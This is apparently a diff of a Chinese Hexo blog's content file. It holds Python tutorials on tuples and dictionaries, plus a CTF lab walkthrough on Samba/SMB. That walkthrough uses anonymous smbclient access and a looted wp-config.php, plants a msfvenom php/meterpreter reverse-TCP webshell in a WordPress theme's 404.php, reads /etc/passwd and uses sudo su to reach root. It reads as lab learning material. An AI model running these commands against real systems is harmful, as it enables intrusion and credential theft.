+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271748724.png"
+                      alt="image.png"
+                ></p>
+<p><em><strong>注意：若创建的元组只含有一个元素时，需要在元素后面加上逗号<code>,</code>，否则会认为你创建的不是元组，而只是一个int类型的整数，括号则被当成一个运算符使用。</strong></em><br><strong>所以更加严格的说法，元组是由逗号标识的，圆括号只是让元组更整洁清晰，并且有一个更明显的特征罢了。</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271751810.png"
+                      alt="image.png"
+                >			</p>
+<p>元组和列表类似，也是通过索引访问元素，并且索引也是<strong>从0开始</strong>。可以进行<strong>截取</strong>和<strong>组合</strong>操作<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271812882.png"
+                      alt="image.png"
+                ></p>
+<blockquote>
+<p>图片来源：菜鸟教程</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271814276.png"
+                      alt="image.png"
+                ></p>
+<h2 id="元组的相关操作"><a href="#元组的相关操作" class="headerlink" title="元组的相关操作"></a>元组的相关操作</h2><h3 id="元组的修改"><a href="#元组的修改" class="headerlink" title="元组的修改"></a>元组的修改</h3><p>元组内单独的元素是无法被修改的，当你想要修改元素时，是一个非法操作，Python会对此报错处理<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271818166.png"
+                      alt="image.png"
+                ></p>
+<p>但是我们可以给元组的变量再次赋值，然后覆盖之前的元组。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271816744.png"
+                      alt="image.png"
+                ></p>
+<p>并且我们可以对元组进行组合，得到一个新的元组<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271817595.png"
+                      alt="image.png"
+                ></p>
+<h3 id="元组的删除"><a href="#元组的删除" class="headerlink" title="元组的删除"></a>元组的删除</h3><p>元组中的元素值也是不允许被删除的，但是我们可以使用del语句来删除整个元组，让元组从程序变量中被删除。<br>删除后的元组若进行打印或者其他操作，将会报错<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271820703.png"
+                      alt="image.png"
+                ></p>
+<h3 id="元组的运算"><a href="#元组的运算" class="headerlink" title="元组的运算"></a>元组的运算</h3><p>可以通过运算符对元组进行相应的运算操作，这里的运算不是指加减乘除这些运算，而是一些针对于元组的操作。如：计算元素个数，元组的连接（得到新元组或者自加成为一个新元组），复制，判断元素是否存在，以及遍历迭代。具体如下：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271821035.png"
+                      alt="image.png"
+                ></p>
+<p><strong>元组的内置函数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">序号</th>
+<th align="left">方法及描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">len(tuple) 计算元组元素个数。</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">max(tuple) 返回元组中元素最大值。</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">min(tuple) 返回元组中元素最小值。</td>
+</tr>
+<tr>
+<td align="left">4</td>
+<td align="left">tuple(iterable) 将可迭代系列转换为元组。</td>
+</tr>
+<tr>
+<td align="left">这里介绍一下第四个<code>tuple(iterable)</code>，这里的可迭代系列一般包括<code>list、str、tuple</code>，你可以简单理解为能够一次返回一个成员的对象，也就是可以 for…in 遍历的。比如你遍历一个列表，它可以每次给你返回一个元素，这就是可迭代。</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h2 id="关于元组不可变的解释"><a href="#关于元组不可变的解释" class="headerlink" title="关于元组不可变的解释"></a>关于元组不可变的解释</h2><p>所谓的元组不可变指的是元组所指向的内存中的内容不可变，也就是当你的程序运行了，那么在这个程序中，你的元组在内存的内容就固定了，你没办法去改变内存中元组的值。<br>这里利用菜鸟教程的例子：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409271857598.png"
+                      alt="image.png"
+                ></p>
+<p>可以看到，当你直接修改元组内部某个或某些元素的值是会报错的，但是当你把元组变量进行重新赋值，是可以的，并且重新赋值后，相当于变量绑定了新的对象，而不是修改了原来的对象，这里就把原来的对象覆盖了，所以也就得到了新的内存地址。</p>
+<h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><h2 id="字典的定义"><a href="#字典的定义" class="headerlink" title="字典的定义"></a>字典的定义</h2><p>字典是另一种可变容器模型，也可以存储任意类型的对象和数据。<br>每个元素或者对象都是一个键值对，也就是一个键一个值<code>key:value</code>，每个键值对之间用逗号<code>,</code>分割，整个字典包在花括号<code>&#123;&#125;</code>中</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;key1 : value1, key2 : value2, key3 : value3 &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><em>ps：同样，<code>dict</code>作为是Python的<strong>关键字</strong>和<strong>内置函数</strong>，是不建议将变量名命名为<code>dict</code>的。</em><br><strong>值得注意：一个字典中，键值对是不能重复的，键必须是唯一的，但是值可以不唯一。比如字典中是每个人的爱好，名字不能相同，但是爱好可以相同。</strong></p>
+<h2 id="字典的创建"><a href="#字典的创建" class="headerlink" title="字典的创建"></a>字典的创建</h2><p>创建空字典：直接用一个大括号<code>&#123;&#125;</code>表示。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">emptyDict = &#123;&#125;</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272030878.png"
+                      alt="image.png"
+                ></p>
+<h2 id="字典的访问"><a href="#字典的访问" class="headerlink" title="字典的访问"></a>字典的访问</h2><p>在字典中，我们已经知道了存储的是一系列键值对，所以每一个键都对应着一个值，这样我们就可以通过使用键来访问与之关联的值。与键相关连的可以是数、字符串、列表甚至又是一个字典（又是嵌套，Python最恶心的东西）。<br>下面我们先看一个例子：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272037666.png"
+                      alt="image.png"
+                ></p>
+<h3 id="get函数"><a href="#get函数" class="headerlink" title="get函数"></a>get函数</h3><p>对于访问一个键值对，这里我们讲解一个方法：<code>get()</code><br>这个方法针对于你想要访问一个键，但是你不知道字典中是否存在这个键的情况。<br>语法：<code>get(key,text)</code></p>
+<ul>
+<li>key：你想访问的键</li>
+<li>text：如果不存在这个键，你想要返回输出的值（<strong>不是必要参数，默认为None</strong>）<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272103525.png"
+                      alt="image.png"
+                ></li>
+</ul>
+<h2 id="字典的相关操作"><a href="#字典的相关操作" class="headerlink" title="字典的相关操作"></a>字典的相关操作</h2><h3 id="添加键值对"><a href="#添加键值对" class="headerlink" title="添加键值对"></a>添加键值对</h3><p>因为字典是一个动态结构，并且键值对都是唯一的，所以我们可以随时添加<strong>不重复</strong>的键值对，并且可以直接通过引用要加的键然后将其赋值，就可以成功添加。（如果对重复的键赋值就变成了更新键值对，可以参考下面<strong>字典的修改</strong>）<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272050469.png"
+                      alt="image.png"
+                ><br>ps：一般添加的键值对都在字典末尾</p>
+<h3 id="字典的修改"><a href="#字典的修改" class="headerlink" title="字典的修改"></a>字典的修改</h3><p>字典的修改十分简单，直接对字典的某个键进行引用并且对其赋值，就会覆盖之前的值，从而更新<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272052351.png"
+                      alt="image.png"
+                ></p>
+<h3 id="删除键值对"><a href="#删除键值对" class="headerlink" title="删除键值对"></a>删除键值对</h3><p>对于键值对的删除，可以删除一个元素，也可以清空整个字典<br>这里我们都使用del语句（ps：这里被删除的元素是永远消失了，就是在之后的程序运行中就没有了，之后你无法再次对这个键进行任何操作，如果你引用这个键将会报错中断程序）<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272055049.png"
+                      alt="image.png"
+                ></p>
+<h2 id="字典的嵌套"><a href="#字典的嵌套" class="headerlink" title="字典的嵌套"></a>字典的嵌套</h2><p>字典的嵌套是分为三类的，第一类是多个字典组合成一个列表，第二类是字典中的键值对的值是一个列表，第三类是字典中键值对的值是一个字典</p>
+<h3 id="字典-列表"><a href="#字典-列表" class="headerlink" title="字典&#x3D;&gt;列表"></a>字典&#x3D;&gt;列表</h3><p>就是可以创建多个字典，然后每个字典作为一个元素组合成一个列表<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272116419.png"
+                      alt="image.png"
+                ></p>
+<h3 id="列表作为值"><a href="#列表作为值" class="headerlink" title="列表作为值"></a>列表作为值</h3><p>这个不过多解释，就是可以把一个列表当成一个键值对的值。<strong>再次强调，列表不能作为键值对的键</strong><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272117979.png"
+                      alt="image.png"
+                ></p>
+<h3 id="字典作为值"><a href="#字典作为值" class="headerlink" title="字典作为值"></a>字典作为值</h3><p>字典套字典套字典套字典……，能一直套娃，和上面类似<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272119297.png"
+                      alt="image.png"
+                ></p>
+<h2 id="字典的特性"><a href="#字典的特性" class="headerlink" title="字典的特性"></a>字典的特性</h2><ol>
+<li>不允许一个键出现两次。如果创建字典时一个键被赋值两次，那么后一个值会覆盖前一个值<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272106702.png"
+                      alt="image.png"
+                ></li>
+<li>键必须是一个不可变的对象类型，比如数字、字符串或者元组。但是列表就不行，因为列表是一个动态的对象<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272108579.png"
+                      alt="image.png"
+                ></li>
+</ol>
+<h2 id="字典的内置函数"><a href="#字典的内置函数" class="headerlink" title="字典的内置函数"></a>字典的内置函数</h2><table>
+<thead>
+<tr>
+<th align="left">序号</th>
+<th align="left">函数及描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left"><strong>dict.clear()</strong> 删除字典内所有元素</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left"><strong>dict.copy()</strong> 返回一个字典的浅复制</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left"><strong>dict.fromkeys()</strong> 创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td>
+</tr>
+<tr>
+<td align="left">4</td>
+<td align="left"><strong>dict.get(key, default&#x3D;None)</strong> 返回指定键的值，如果键不在字典中返回 default 设置的默认值</td>
+</tr>
+<tr>
+<td align="left">5</td>
+<td align="left"><strong>key in dict</strong> 如果键在字典dict里返回true，否则返回false</td>
+</tr>
+<tr>
+<td align="left">6</td>
+<td align="left"><strong>dict.items()</strong> 以列表返回一个视图对象</td>
+</tr>
+<tr>
+<td align="left">7</td>
+<td align="left"><strong>dict.keys()</strong> 返回一个视图对象</td>
+</tr>
+<tr>
+<td align="left">8</td>
+<td align="left"><strong>dict.setdefault(key, default&#x3D;None)</strong> 和**get()**类似, 但如果键不存在于字典中，将会添加键并将值设为default</td>
+</tr>
+<tr>
+<td align="left">9</td>
+<td align="left"><strong>dict.update(dict2)</strong> 把字典dict2的键&#x2F;值对更新到dict里</td>
+</tr>
+<tr>
+<td align="left">10</td>
+<td align="left"><strong>dict.values()</strong> 返回一个视图对象</td>
+</tr>
+<tr>
+<td align="left">11</td>
+<td align="left"><strong>[pop(key,default])</strong> 删除字典 key（键）所对应的值，返回被删除的值。</td>
+</tr>
+<tr>
+<td align="left">12</td>
+<td align="left"><strong>popitem()</strong> 返回并删除字典中的最后一对键和值。</td>
+</tr>
+<tr>
+<td align="left">13</td>
+<td align="left"><strong>str()</strong> 输出字典，可以打印的字符串表示。其实就是把字典整体作为字符串输出</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>参考：菜鸟教程</p>
+</blockquote>
+<p>这里演示部分函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409272123327.png"
+                      alt="image.png"
+                ></p>
+]]></content>
+      <categories>
+        <category>python</category>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SambaSMB信息泄露（Serve Message Block)</title>
+    <url>/2024/09/11/cfb8804dd1b5/</url>
+    <content><![CDATA[<h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
+<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
+<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
+<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
+<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
+<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
+<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
+<p>1. </p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
+<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
+<p>连接mysql</p>
+<p><code>mysql -h ip -u user -p</code></p>
+<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
+<p><code>ssh 用户名@ip</code></p>
+<p>尝试数据库密码，密码错误</p>
+</li>
+<li><p>针对SMB协议远程溢出漏洞进行分析</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
+
+<p>发现也没有漏洞</p>
+</li>
+</ol>
+<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
+<p>扫描到网站后台目录</p>
+<p>打开并输入用户名和密码</p>
+<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
+<p>我们将webshell上传到editor的404.php页面</p>
+<p>然后打开404页面</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>
+
+<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+
+<p>发现获得服务器的通用权限</p>
+<p>优化终端</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>查看当前计算机的用户</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p>查看敏感用户，发现一个togie</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -1693,72 +1759,6 @@
         <tag>python</tag>
         <tag>common</tag>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SambaSMB信息泄露（Serve Message Block)</title>
-    <url>/2024/09/11/cfb8804dd1b5/</url>
-    <content><![CDATA[<h1 id="Samba-SMB信息泄露"><a href="#Samba-SMB信息泄露" class="headerlink" title="Samba&#x2F;SMB信息泄露"></a>Samba&#x2F;SMB信息泄露</h1><p>Serve Message Block</p>
-<p>&#x3D;&#x3D;SMB常用端口为139，445&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;mysql常用端口为3306&#x3D;&#x3D;</p>
-<p>SMB协议用来访问网络资源，下载对应的资源文件</p>
-<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p><code>nmap -sV ip</code> 探测开放服务</p>
-<p><code>nmap -A -v -T4 ip </code>探测全部信息（T4——最大线程速度）</p>
-<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
-<h2 id="针对SMB协议弱点分析"><a href="#针对SMB协议弱点分析" class="headerlink" title="针对SMB协议弱点分析"></a>针对SMB协议弱点分析</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol>
-<li><p>针对SMB协议，使用空口令，弱口令尝试登陆，并查看敏感文件，下载查看；</p>
-<p>1. </p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L ip   <span class="comment">#表示该ip所有分享的目录和链接</span></span><br><span class="line"><span class="comment"># 输入后需要输入密码，我们直接回车，表示空命令</span></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\share$&#x27;</span> <span class="comment"># 表示要查看的共享文件夹 share可以替换为其他的如print等</span></span><br><span class="line">smbclient <span class="string">&#x27;\\ip\IPC$&#x27;</span> <span class="comment"># 登录空链接</span></span><br><span class="line"></span><br><span class="line">get 敏感文件名 <span class="comment"># 下载敏感文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>打开下载的文件deets.txt，可以发现密码password为12345 </p>
-<p>再打开wordpress文件夹，然后下载wp-config.php并打开，得到数据库名，用户名user和密码pwd</p>
-<p>连接mysql</p>
-<p><code>mysql -h ip -u user -p</code></p>
-<p>但是可能无法远程登录mysql，于是尝试ssh登录</p>
-<p><code>ssh 用户名@ip</code></p>
-<p>尝试数据库密码，密码错误</p>
-</li>
-<li><p>针对SMB协议远程溢出漏洞进行分析</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br><span class="line"></span><br><span class="line">searchsploit Samba smbd 3.X - 4.X</span><br></pre></td></tr></table></figure></div>
-
-<p>发现也没有漏洞</p>
-</li>
-</ol>
-<h2 id="针对HTTP协议弱点分析"><a href="#针对HTTP协议弱点分析" class="headerlink" title="针对HTTP协议弱点分析"></a>针对HTTP协议弱点分析</h2><h3 id="1-浏览器查看网站"><a href="#1-浏览器查看网站" class="headerlink" title="1. 浏览器查看网站"></a>1. 浏览器查看网站</h3><h3 id="2-使用dirb-nicko扫描"><a href="#2-使用dirb-nicko扫描" class="headerlink" title="2. 使用dirb nicko扫描"></a>2. 使用dirb nicko扫描</h3><p><code>dirb http://ip:port/</code><strong>(80端口可省略)</strong></p>
-<p>扫描到网站后台目录</p>
-<p>打开并输入用户名和密码</p>
-<h3 id="3-上传webshell"><a href="#3-上传webshell" class="headerlink" title="3.上传webshell"></a>3.上传webshell</h3><p>wordpress有常见漏洞</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机ip lport=4444 raw</span><br><span class="line"><span class="comment"># 将生成的webshell复制到一个php文件中</span></span><br><span class="line">gedit webshell.php</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi//handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp <span class="comment"># 监听</span></span><br><span class="line"><span class="built_in">set</span> lhost 攻击机ip</span><br><span class="line">show options <span class="comment"># 查看参数</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
-
-<p>然后就是上传webshell，并且执行（访问具有webshell的php页面）</p>
-<p>我们将webshell上传到editor的404.php页面</p>
-<p>然后打开404页面</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">http://靶场IP/wordpress/wp-content/themes/twentyfourteen/404.php</span><br></pre></td></tr></table></figure></div>
-
-<p>然后返回攻击机，发现成功监听，查看当前用户，执行以下命令</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
-
-<p>发现获得服务器的通用权限</p>
-<p>优化终端</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>查看当前计算机的用户</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
-
-<p>查看敏感用户，发现一个togie</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su togie</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码为12345，前面获取的密码</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="4-提升权限"><a href="#4-提升权限" class="headerlink" title="4. 提升权限"></a>4. 提升权限</h3><p>查找共享目录下的敏感文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -2446,24 +2446,52 @@
   <entry>
     <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
     <url>/2024/09/23/e7bb2541b07a/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码不正确，请联系作者获取密码." data-whm="抱歉, 这个文章不能被校验, 不过您还是能查看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="283276206a5d5599499a5fdbb80b1bf0957cf82fe642ca94827d0408e50a4bc8">6bf61b5c061a9f65d55209af9649d95e0744c064088780e8d1db165e52d866112d2b781d67d0b98d9cf7e60dbb4e293d9a64c787cd4aac609782a76d196693ce9d7f26c3e47126917617ec6561daa4825e87bd8652d122bbda13b91131b140b1d74d4253b83e7ed90a84eafcbc72297a89b94231448b70715026da3253f1ddc807a3cd34a6b79c4227f9507405cf36c104ca5e991fda5cf3f5322e222ecbf5b033694aed917d6d765841eef882bad062b4601203ffe6fb1195765ad8657d2d54e6716dfe60749ed4ccb75444cb4e57437bb88f6df2d5b02a19bcad531622caf4e0d072a22db37bdf705d6e2c039b12db944a480927af2766ab2f9fb1f25ad20a9dc166c835d2b58d9238a4ffea62fb40437fbe842ed6e2df05dd01e6cf73489488fb2bf7efb88c95397f902a5b3b5dc21086c20e5806bb5addcfafde545130cd84cd6a2ce76cda296eeb82c510a96484b7d17209cd941dd48f7c14604d7beb83f0afe0588471a7e6ee3eed88e5097f7213bba4907ed31e2a7939163aac592800ab4fc58babe44122a21154c0322a7107c78ddd7fde79b8423ca8f031c5dead654668f18c10887379a2c3540d3e017dbbd5f628103024fa89fb748460120f8452a9282d3ee9ad36fcd121a7181bc9a0ac064384d2421b003adeb1dc3c1c58ae539c92939690b25bff443100e6f00ef5b1b93aafeb73ea8ae5f33e3f53789f4f88599194bead6b53151551dedb09e8a74691df6df5db42e25997adf301f130541e2739bfb7c7ba5b11717c5510a3dad748ee6299132a3a305ef0d964e8d8ca9dcd8a0555e67c26a05a74221b496546829fe7a2dd1fb909986d9115f21447445f936606a57a692af4c85bce23d1a98b3dcbacfa18688bc0d12bc7a6c1b4fef29711c1ea94f2a34c22f04ebfee0778eeacf6397bbc692d590c06856e4f744c8dc66b4c8fb6de776b627d3b2ce63feb84b4164d379b08567f3f811a739e774725a76a04e6471ba1a45d582c54850fb139828e10a644f3d40eaa9820d64415deca84f56b0db8320589f3b032f05d67aed7715841474dd3d4ba00d9334139170c67596fbabfd3d67935bcc3160521a910e182616b8c0824f0a8cda1749da434dd312eeaec1baed1d8c1897a776fde8d8202c35349377fff90d40fac4007b62c9b43d40aff4ab1862836bf70b79ee522389b705be7a84de5ce0d7eb50176de4765a442d4b0f0f20940e841a4bb5c72259165f6d39022d3b40d2bac3d7e52a7627f895882c6e4b1b7d77e80145ee60d156a91294015b689a6faec75f200bd021a8df56bac7e9441bf17ee87439b459694b30d3f5af19c002e598a5700183926fe4ea1ad1bd181e51277ca3ad28ec46d6e12ae9ca056e2dc90e880688f43435aea7529f91823a60a34469ef699c2b1d1343490beaa6cd9f493dfe5262d1c2a53692529ccf7776698fba3a22b3c18c27453382cf80573ffda88aa661